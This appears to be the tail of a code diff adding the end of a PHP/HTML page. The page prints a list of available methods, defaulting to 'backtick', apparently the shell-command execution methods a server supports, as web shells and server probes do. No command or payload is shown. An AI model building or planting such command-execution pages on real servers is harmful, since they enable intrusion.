+        echo $methods ? implode(', ', $methods) : 'backtick';
+        ?>
+    </div>
+</body>
+</html>
